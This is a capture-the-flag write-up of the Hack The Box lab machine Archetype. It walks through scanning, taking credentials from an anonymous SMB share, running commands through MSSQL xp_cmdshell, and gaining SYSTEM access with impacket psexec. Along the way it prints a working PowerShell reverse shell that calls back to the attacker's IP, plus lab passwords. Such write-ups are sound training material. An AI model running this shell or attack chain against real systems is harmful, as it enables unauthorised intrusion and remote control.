---
title: "Hack The Box write-up: Archetype"
date: 2020-10-28T21:34:07-07:00
hero: /images/posts/security/htb-archetype/banner.svg
description: A write-up for solving Archetype on hackthebox.eu
theme: Toha
author:
  name: Chuck Valenza
  image: /images/avatar.svg
menu:
  sidebar:
    name: "HTB: Archetype"
    identifier: htb-archetype
    parent: security
    weight: 500
---

This is a write-up for the Archetype box on [hackthebox.eu](https://www.hackthebox.eu/). It's one of the boxes in their "Starting Point" series.

## Scanning

Scanning finds a few interesting ports

```console
[ cvalenza@kali ] startingpoint $ sudo nmap -sS -p 1-1023 --min-rate=1000 -T4 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 11:43 MST
Nmap scan report for 10.10.10.27
Host is up (0.16s latency).
Not shown: 1020 closed ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds


[ cvalenza@kali ] startingpoint $ sudo nmap -sS -p 1024-49151 --min-rate=1000 -T4 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 11:44 MST
Nmap scan report for 10.10.10.27
Host is up (0.16s latency).
Not shown: 48125 closed ports
PORT      STATE SERVICE
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm

Nmap done: 1 IP address (1 host up) scanned in 49.44 seconds


[ cvalenza@kali ] startingpoint $ sudo nmap -sS -p 49152-65535 --min-rate=1000 -T4 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 11:45 MST
Nmap scan report for 10.10.10.27
Host is up (0.16s latency).
Not shown: 16378 closed ports
PORT      STATE SERVICE
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 17.10 seconds
```

{{< vs 1 >}}

## Enumeration

Enumerating those ports we see an SMB share, MS SQL, and wsman/winrm running.

```console
[ cvalenza@kali ] startingpoint $ sudo nmap -sS -sV -T4 --min-rate=1000 -p 135,139,445,1433,5985,47001,49664-49669 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 11:59 MST
Nmap scan report for 10.10.10.27
Host is up (0.24s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server vNext tech preview 14.00.1000
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
                                                                                                                                                     
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.81 seconds
```

{{< vs 1 >}}

### NetBIOS & SMB

NetBIOS didn't give us anything useful, but SMB gave us some useful information. 

```console
[ cvalenza@kali ] startingpoint $ sudo nmap -T4 --script nbstat -p 139 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 12:05 MST
Nmap scan report for 10.10.10.27
Host is up (0.20s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn

Nmap done: 1 IP address (1 host up) scanned in 4.69 seconds


[ cvalenza@kali ] startingpoint $ sudo nmap -T4 --script smb-os-discovery -p 445 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 12:06 MST
Nmap scan report for 10.10.10.27
Host is up (0.26s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-10-18T19:22:54-07:00

Nmap done: 1 IP address (1 host up) scanned in 4.68 seconds
```

{{< vs 1 >}}

### MS SQL

MS-SQL is starting to look useful, given the patch status.

```console
[ cvalenza@kali ] startingpoint $ sudo nmap -T4 --script ms-sql-info -p 1433 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 12:08 MST
Nmap scan report for 10.10.10.27
Host is up (0.24s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
```

{{< vs 1 >}}

### WinRM

Admittedly, I had to look up winrm, but remote management definitely peaked my interest...

```console
[ cvalenza@kali ] startingpoint $ sudo nmap -T4 --script http-headers -p 5985,47001 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 12:14 MST
Nmap scan report for 10.10.10.27
Host is up (0.24s latency).

PORT      STATE SERVICE
5985/tcp  open  wsman
47001/tcp open  winrm

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

{{< vs 1 >}}

Couldn't make much of these. Sending garbage data with `nc` doesn't seem to produce any useful output. I'll come back here if I'm stuck.

```console
[ cvalenza@kali ] startingpoint $ sudo nmap -T4 --script rpcinfo -p 49664-49669 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 12:14 MST
Nmap scan report for 10.10.10.27
Host is up (0.21s latency).

PORT      STATE SERVICE
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds

```

{{< vs 1 >}}

## Vulnerability Analysis & Exploitation

### SMB

Digging into SMB, we get a connect on both `IPC$` and `backups` shares without auth.

```console
[ cvalenza@kali ] startingpoint $ smbclient -N -L //10.10.10.27/

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available

[ cvalenza@kali ] startingpoint $ smbclient -N //10.10.10.27/ADMIN$
tree connect failed: NT_STATUS_ACCESS_DENIED

[ cvalenza@kali ] startingpoint $ smbclient -N //10.10.10.27/backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 05:20:57 2020
  ..                                  D        0  Mon Jan 20 05:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 05:23:02 2020

		10328063 blocks of size 4096. 8229696 blocks available

[ cvalenza@kali ] startingpoint $ smbclient -N //10.10.10.27/C$
tree connect failed: NT_STATUS_ACCESS_DENIED

[ cvalenza@kali ] startingpoint $ smbclient -N //10.10.10.27/IPC$
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_INVALID_INFO_CLASS listing \*
```

{{< vs 1 >}}

Dosn't appear that we have read privilege to the IPC$ share, but that looks like a config file on the backup share...

```console
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

{{< vs 1 >}}

And it looks like there's a SQL password in there! We'll use that to test our connection to the next port, 1433.

```console
user: ARCHETYPE\sql_svc
pass: M3g4c0rp123
```

{{< vs 1 >}}

### MS SQL

Let's first see if we can connect to the database...

```console
[ cvalenza@kali ] startingpoint $ sqsh -U "ARCHETYPE\sql_svc" -P M3g4c0rp123 -S 10.10.10.27:1433 -m pretty
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> 
```

{{< vs 1 >}}

Awesome! Let's see what we have for server roles...directly off of the MS page on [sys.server_role_members](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-role-members-transact-sql?view=sql-server-2017).

```console
1> SELECT sys.server_role_members.role_principal_id, role.name AS RoleName,
2>     sys.server_role_members.member_principal_id, member.name AS MemberName
3> FROM sys.server_role_members
4> JOIN sys.server_principals AS role
5>     ON sys.server_role_members.role_principal_id = role.principal_id
6> JOIN sys.server_principals AS member
7>     ON sys.server_role_members.member_principal_id = member.principal_id;
8> go
+===================+========================================================================================================+=====================+=========================================================================================================+
| role_principal_id | RoleName                                                                                               | member_principal_id | MemberName                                                                                              |
+===================+========================================================================================================+=====================+=========================================================================================================+
|                 3 | sysadmin                                                                                               |                   1 | sa                                                                                                      |
+-------------------+--------------------------------------------------------------------------------------------------------+---------------------+---------------------------------------------------------------------------------------------------------+
|                 3 | sysadmin                                                                                               |                 259 | ARCHETYPE\sql_svc                                                                                       |
+-------------------+--------------------------------------------------------------------------------------------------------+---------------------+---------------------------------------------------------------------------------------------------------+
|                 3 | sysadmin                                                                                               |                 260 | NT SERVICE\SQLWriter                                                                                    |
+-------------------+--------------------------------------------------------------------------------------------------------+---------------------+---------------------------------------------------------------------------------------------------------+
|                 3 | sysadmin                                                                                               |                 261 | NT SERVICE\Winmgmt                                                                                      |
+-------------------+--------------------------------------------------------------------------------------------------------+---------------------+---------------------------------------------------------------------------------------------------------+
|                 3 | sysadmin                                                                                               |                 262 | NT SERVICE\MSSQLSERVER                                                                                  |
+-------------------+--------------------------------------------------------------------------------------------------------+---------------------+---------------------------------------------------------------------------------------------------------+
|                 3 | sysadmin                                                                                               |                 264 | NT SERVICE\SQLSERVERAGENT                                                                               |
+-------------------+--------------------------------------------------------------------------------------------------------+---------------------+---------------------------------------------------------------------------------------------------------+

(6 rows affected)

```

{{< vs 1 >}}

Perfect, our user has the sysadmin role. Let's try to execute commands:

```console
1> EXEC xp_cmdshell 'whoami';
2> go
+============================================================================================================================================================================================================================================================+
| output                                                                                                                                                                                                                                                     |
+============================================================================================================================================================================================================================================================+
| archetype\sql_svc                                                                                                                                                                                                                                          |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|                                                                                                                                                                                                                                                            |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

(2 rows affected, return status = 0)
```

{{< vs 1 >}}

#### r.ps1

Perfect. Let's get our reverse shell on to the server so we can control this more directly. We'll use powershell since this is a Windows Server 2019 box. My laptop's IP in this instance is 10.10.14.239.

```console
$rev_ip = "10.10.14.239"

$client = New-Object System.Net.Sockets.TCPClient($rev_ip,80)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
	$sendback = (iex $data 2>&1 | Out-String )
	$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
	$stream.Write($sendbyte,0,$sendbyte.Length)
	$stream.Flush()
	}
$client.Close()
```

{{< vs 1 >}}

#### s.sh

We'll need a way to get this on the server. The easiest way is to serve the file with python. I wrote a small shell script to create the server and a folder to serve our reverse shell. Place your PowerShell file in the folder it creates.

```bash
#!/bin/bash

ip=$1
port=$2
dir=$3

mkdir -p $dir
python3 -m http.server $port --bind $ip --directory $dir
```

{{< vs 1 >}}

Once we start that on our local machine, we can pull down the shell with `xp_cmdshell`.

server

```bash
1> EXEC xp_cmdshell 'cd'
2> go
+============================================================================================================================================================================================================================================================+
| output                                                                                                                                                                                                                                                     |
+============================================================================================================================================================================================================================================================+
| C:\Windows\system32                                                                                                                                                                                                                                        |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|                                                                                                                                                                                                                                                            |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

(2 rows affected, return status = 0)
```

{{< vs 1 >}}

We don't have permissions to download to system32, but we can download to our own home directory.

```console
[ cvalenza@kali ] startingpoint $ ./l.sh 8080
listening on [any] 8080 ...
10.10.10.27: inverse host lookup failed: Unknown host
connect to [10.10.14.239] from (UNKNOWN) [10.10.10.27] 50460
Start-Process -FilePath "dir C:\Users\Administrator" -Verb RunAs
# whoami
archetype\sql_svc
# Start-Process -FilePath "dir" -Verb RunAs                       
# whoami
archetype\sql_svc
# cd C:\Users\sql_svc
# dir Desktop


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6:37 AM             32 user.txt                                                              


# cat Desktop\user.txt
```

{{< vs 1 >}}

Boom, user own. After trying to write several scripts to elevate priviledge, I got stumped. I did a recursive search for "admin" from `C:\Users\sql_svc`.

```console
# dir -Force -recurse *.* | sls -pattern "admin" | select -unique path

Path                                                                                            
----                                                                                            
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

{{< vs 1 >}}

Well, it's a lab so you can't really fault them for having only one command in the shell history, but it's definitely a useful one!

```console
# net.exe use T: \\Archetype\IPC$ /user:administrator MEGACORP_4dm1n!!
# net use   
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
OK           T:        \\Archetype\backups       Microsoft Windows Network
The command completed successfully.
# net.exe use S: \\Archetype\ADMIN$ /user:administrator MEGACORP_4dm1n!!
The command completed successfully.

# net use
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
OK           S:        \\Archetype\ADMIN$        Microsoft Windows Network
OK           T:        \\Archetype\backups       Microsoft Windows Network
The command completed successfully.
```

{{< vs 1 >}}

Now the final piece is gaining access to the flag on the Administrator's Desktop. I had little success getting a reverse shell through metasploit, so I tried psexec. Doing a `locate psexec` on kali came up with this script.

```console
[ cvalenza@kali ] startingpoint $ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file WnMscHgX.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service XZeK on 10.10.10.27.....
[*] Starting service XZeK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users\Administrator\Desktop

10/27/2020  04:08 PM    <DIR>          .
10/27/2020  04:08 PM    <DIR>          ..
10/26/2020  10:58 AM                 7 cat.txt
10/25/2020  08:54 PM                 0 cd
10/26/2020  04:20 PM                48 hackerinoWasHere
10/27/2020  04:08 PM                17 Hello friend.txt
10/25/2020  05:48 PM               124 illusion.txt
02/25/2020  07:36 AM                32 root.txt
10/27/2020  06:27 AM                26 VincenzoCampania.txt
               7 File(s)            254 bytes
               2 Dir(s)  33,052,995,584 bytes free

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
```

{{< vs 1 >}}

And there's our `root` pwn!

### WinRM

Let's finally look at the winrm service we found earlier...

```console
[ cvalenza@kali ] startingpoint $ sudo gem install winrm
[ cvalenza@kali ] startingpoint $ rwinrm sql_svc@10.10.10.27
Password: 
PS sql_svc@10.10.10.27> ?
Authentication failed, bad user name or password
[ cvalenza@kali ] startingpoint $ rwinrm administrator@10.10.10.27
Password: 
PS administrator@10.10.10.27> ?
Authentication failed, bad user name or password
```

{{< vs 1 >}}

Bummer, looks like the user/pass we got earlier doesn't work there for any of the users.

